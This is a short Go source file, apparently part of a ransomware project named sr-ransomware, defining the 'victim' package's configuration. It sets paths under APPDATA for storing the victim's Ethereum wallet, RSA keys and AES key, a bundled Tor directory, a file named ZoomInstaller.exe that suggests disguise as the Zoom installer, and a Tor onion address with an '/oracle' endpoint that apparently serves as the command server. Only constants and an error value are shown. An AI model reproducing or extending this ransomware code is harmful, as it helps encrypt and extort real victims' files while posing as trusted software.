package victim

import (
    "os"

    "github.com/sug0/sr-ransomware/go/errors"
)

const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"

var (
    workDir = os.Getenv("APPDATA") + `\Zoomer`

    victimEthereumWallet = workDir + `\a.flu`
    victimPublicKey      = workDir + `\b.flu`
    victimSecretKey      = workDir + `\c.flu`
    victimAESKey         = workDir + `\d.flu`

    torDirectory  = workDir + `\Tor`
    zoomInstaller = workDir + `\ZoomInstaller.exe`
)

const (
    hiddenServiceBase   = "http://v6au4j6rkvve6s2b4mbv6cvhc3oqswqfvzdjv2exyefsiyxrur5bktyd.onion"
    hiddenServiceOracle = hiddenServiceBase + "/oracle"
)

var (
    errNotFullWrite = errors.New(pkg, "failed to write all data")
)
